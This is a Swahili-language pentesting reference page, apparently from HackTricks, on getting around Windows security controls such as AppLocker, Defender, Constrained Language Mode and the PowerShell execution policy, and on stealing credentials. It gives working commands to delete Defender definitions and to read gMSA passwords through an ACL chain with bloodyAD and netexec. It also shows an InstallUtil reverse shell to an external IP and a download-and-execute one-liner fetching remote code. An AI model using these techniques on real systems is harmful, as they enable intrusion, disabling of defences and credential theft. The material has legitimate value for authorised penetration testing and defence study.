# Udhibiti wa Usalama wa Windows

{{#include ../../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha nyeupe ya programu ni orodha ya programu za programu zilizokubaliwa au faili za utekelezaji zinazoruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na programu zisizoruhusiwa ambazo hazilingani na mahitaji maalum ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni suluhisho la Microsoft la **orodha nyeupe ya programu** na huwapa wasimamizi wa mfumo udhibiti juu ya **programu na faili ambazo watumiaji wanaweza kuendesha**. Inatoa **udhibiti wa kina** juu ya executables, scripts, Windows installer files, DLLs, packaged apps, na packed app installers.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na upatikanaji wa kuandika kwa saraka fulani, **lakini yote haya yanaweza kuepukika**.

### Angalia

Angalia ni faili/viendelezi gani vimeorodheshwa kwenye orodha nyeusi au orodha nyeupe:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya rejista ina usanidi na sera zinazotumika na AppLocker, ikitoa njia ya kupitia seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Zinazofaa **Writable folders** za ku-bypass AppLocker Policy: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **writable folders** ambazo unaweza kutumia ili **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Kwa kawaida mafaili ya **zinazoaminika** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries pia yanaweza kusaidia kupitisha AppLocker.
- **Sheria zilizotengenezwa vibaya pia zinaweza kupitishwa**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folda iitwayo `allowed`** mahali popote na itaruhusiwa.
- Mashirika pia mara nyingi hujikita katika **kuzuia `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, lakini husahau kuhusu **mengine** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **DLL enforcement mara chache huwa imewezeshwa** kutokana na mzigo wa ziada inaweza kuweka kwenye mfumo, na wingi wa upimaji unaohitajika kuhakikisha hakuna kitu kitakachovunjika. Kwa hivyo kutumia **DLLs as backdoors** kutasaidia kupitisha AppLocker.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kutekeleza **Powershell** code katika mchakato wowote na kupitisha AppLocker. Kwa taarifa zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Taarifa za kuingia za eneo zipo katika faili hii; nywila zimehashiwa.

### Local Security Authority (LSA) - LSASS

Taarifa za kuingia (zilizo hashed) zimeshifadhiwa katika kumbukumbu ya subsistemu hii kwa sababu za Single Sign-On.\
**LSA** inaendesha sera za **usalama wa eneo** (sera za nywila, ruhusa za watumiaji...), **authentication**, **access tokens**...\
LSA ndicho kitakachokagua cheti zilizotolewa ndani ya faili ya **SAM** (kwa kuingia kwa eneo) na kuzungumza na **domain controller** kuthibitisha mtumiaji wa domain.

Taarifa za kuingia zimeshifadhiwa ndani ya mchakato **LSASS**: tiketi za Kerberos, hashes NT na LM, nywila zinazoweza kufunguliwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi kwenye diski baadhi ya taarifa za kuingia:

- Nywila ya akaunti ya kompyuta ya Active Directory (domain controller isiyoweza kufikiwa).
- Nywila za akaunti za huduma za Windows
- Nywila za kazi zilizopangwa
- Zaidi (nywila za programu za IIS...)

### NTDS.dit

Ni hifadhidata ya Active Directory. Ipo tu kwenye Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, na katika toleo za Windows Server. Inazuia zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kupitisha ulinzi huu**.

### Check

Ili kukagua **hali** ya **Defender** unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua kama imewezeshwa):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Kwa ajili ya kuorodhesha pia unaweza kuendesha:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS inalinda faili kwa usimbaji, ikitumia **ufunguo wa simetriki** unaojulikana kama **File Encryption Key (FEK)**. Ufunguo huu unasimbwa kwa kutumia **public key** ya mtumiaji na kuhifadhiwa ndani ya $EFS **alternative data stream** ya faili iliyosimbwa. Wakati ufunguzi unahitajika, **private key** inayolingana ya cheti dijitali la mtumiaji inatumika kusimua FEK kutoka kwenye mfululizo wa $EFS. Maelezo zaidi yanaweza kupatikana [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Madaraja ya kuyafungua bila kuanzishwa na mtumiaji** ni pamoja na:

- Wakati faili au folda zinapotamishwa kwenda kwenye mfumo wa faili usio wa EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), zinafutwa usimbaji kwa 자동.
- Faili zilizofichwa zinazotumwa kupitia mtandao kwa protokoli ya SMB/CIFS zinasimuliwa kabla ya kutumwa.

Njia hii ya usimbaji inaruhusu **ufikiaji wazi** wa faili zilizofichwa kwa mmiliki. Hata hivyo, kubadilisha nenosiri la mmiliki na kuingia tu hakutaruhusu kusimuliwa.

**Mambo muhimu kukumbuka**:

- EFS inatumia FEK wa simetriki, iliyosimbwa kwa public key ya mtumiaji.
- Kusimua kunatumia private key ya mtumiaji kupata FEK.
- Kusimuliwa kwa automatiki hutokea katika hali maalum, kama kunakopywa kwenye FAT32 au wakati wa usafirishaji wa mtandao.
- Faili zilizofichwa zinapatikana kwa mmiliki bila hatua za ziada.

### Check EFS info

Angalia kama **mtumiaji** ame **tumia** **huduma** hii kwa kukagua kama njia hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **who** has **access** to the file using cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **encrypt** na **decrypt** faili zote

### Decrypting EFS files

#### Being Authority System

Njia hii inahitaji **mtumiaji wa mwathiriwa** kuwa **anazungusha** **mchakato** ndani ya host. Ikiwa hivyo ndio hali, kwa kutumia session za `meterpreter` unaweza kujifanya token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwenda mchakato wa mtumiaji.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** kurahisisha usimamizi wa akaunti za service katika miundombinu ya IT. Tofauti na akaunti za service za jadi ambazo mara nyingi zinawekwa na sifa ya "**Password never expire**", gMSA zinatoa suluhisho salama na rahisi kusimamia:

- **Automatic Password Management**: gMSA zinatumia nenosiri tata la herufi 240 ambalo hubadilika kiotomatiki kulingana na sera za domain au kompyuta. Mchakato huu unafanywa na Key Distribution Service (KDC) ya Microsoft, kuondoa hitaji la masasisho ya nenosiri kwa mikono.
- **Enhanced Security**: Akaunti hizi hazifikiriwi kwa lockouts na hazitumiwi kwa interactive logins, hivyo kuongeza usalama.
- **Multiple Host Support**: gMSA zinaweza kushirikiwa kati ya host nyingi, zikifanya kuwa bora kwa services zinazoendesha kwenye server nyingi.
- **Scheduled Task Capability**: Tofauti na managed service accounts, gMSA zinaunga mkono kuendesha scheduled tasks.
- **Simplified SPN Management**: Mfumo hubadilisha Service Principal Name (SPN) kiotomatiki wakati kuna mabadiliko kwa sAMaccount details za kompyuta au jina la DNS, kurahisisha usimamizi wa SPN.

Nenosiri za gMSA zimetunzwa kwenye mali ya LDAP _**msDS-ManagedPassword**_ na hubadilishwa kiotomatiki kila siku 30 na Domain Controllers (DCs). Nenosiri hili, blob ya data iliyosimbwa inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza kuonekana tu na wasimamizi walioidhinishwa na server zinazoweka gMSA, kuhakikisha mazingira salama. Ili kupata taarifa hii, inahitaji muunganisho uliolindwa kama LDAPS, au muunganisho lazima uwe authenticated na 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Unaweza kusoma nenosiri hili kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Pia, angalia [web page](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kutekeleza **NTLM relay attack** ili **read** **password** ya **gMSA**.

### Kutumia vibaya mnyororo wa ACL kusoma password iliyosimamiwa ya gMSA (GenericAll -> ReadGMSAPassword)

Katika mazingira mengi, watumiaji wenye vigezo vya chini wanaweza kupitisha kwa siri za gMSA bila kuathiri DC kwa kutumia vibaya ACL za vitu zilizopangwa vibaya:

- Kundi unachosimamia (mfano, via GenericAll/GenericWrite) umepewa `ReadGMSAPassword` juu ya gMSA.
- Kwa kujiunga na kundi hilo, unapata haki ya read blob ya `msDS-ManagedPassword` ya gMSA kupitia LDAP na kupata NTLM credentials zinazotumika.

Mtiririko wa kawaida wa kazi:

1) Gundua njia kwa kutumia BloodHound na taja principals zako za foothold kama Owned. Angalia edges kama:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Jumuisha wewe mwenyewe katika kundi la kati unaolisimamia (mfano kwa bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Soma neno la siri la gMSA linalosimamiwa kupitia LDAP na tengeneza hash ya NTLM. NetExec inafanya otomatiki uondoaji wa `msDS-ManagedPassword` na uongofu hadi NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Thibitisha kama gMSA ukitumia NTLM hash (plaintext haidingiki). Ikiwa akaunti iko katika Remote Management Users, WinRM itafanya kazi moja kwa moja:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Vidokezo:
- Usomaji wa LDAP wa `msDS-ManagedPassword` unahitaji sealing (mfano: LDAPS/sign+seal). Zana zinashughulikia hili moja kwa moja.
- gMSAs mara nyingi hupewa haki za ndani kama WinRM; thibitisha uanachama wa kikundi (mfano: Remote Management Users) ili kupanga lateral movement.
- Ikiwa unahitaji blob tu ili kuhesabu NTLM wewe mwenyewe, ona muundo wa MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), inaruhusu usimamizi wa nywila za Administrator wa mkoa. Nywila hizi, ambazo ni **zilizoanzishwa kwa nasibu**, za kipekee, na **zinabadilishwa mara kwa mara**, zinahifadhiwa kati katika Active Directory. Upatikanaji wa nywila hizi umefungwa kupitia ACLs kwa watumiaji walioteuliwa. Ikiwa ruhusa za kutosha zimepewa, uwezo wa kusoma nywila za admin wa mkoa unapatikana.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inazuia vipengele vingi** vinavyohitajika ili kutumia PowerShell kwa ufanisi, kama kuzuia COM objects, kuruhusu tu aina za .NET zilizokubaliwa, XAML-based workflows, PowerShell classes, na zaidi.

### **Kagua**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Kuvuka
```bash
#Easy bypass
Powershell -version 2
```
Kwenye Windows za sasa bypass hiyo haitafanya kazi lakini unaweza kutumia [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikompaila unaweza kuhitaji** **kufanya** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha project kuwa .Net4.5**.

#### Bypass ya moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** code katika mchakato wowote na kuepuka constrained mode. Kwa taarifa zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Sera ya Utekelezaji ya PS

Kwa chaguo-msingi imewekwa kuwa **restricted.** Njia kuu za kuepuka sera hii:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Zaidi zinaweza kupatikana [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Ni API inayotumika kuthibitisha watumiaji.

SSPI itawajibika kutafuta itifaki inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendekezwa kwa hili ni Kerberos. Kisha SSPI itajadili itifaki gani ya uthibitishaji itakayotumika; itifaki hizi za uthibitishaji zinaitwa Security Support Provider (SSP), ziko ndani ya kila mashine ya Windows kama DLL na mashine zote mbili lazima ziunge mkono ile ile ili ziweze kuwasiliana.

### SSP kuu

- **Kerberos**: Inayopendekezwa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Sababu za utangamano
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers na LDAP, nenosiri kwa fomu ya MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL and TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Inatumika kujadiliana itifaki ya kutumia (Kerberos au NTLM, Kerberos ikiwa chaguo-msingi)
- %windir%\Windows\System32\lsasrv.dll

#### Mazungumzo yanaweza kutoa njia kadhaa au njia moja tu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **maombi ya idhini kwa shughuli zinazohitaji ruhusa ya juu**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Marejeo

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
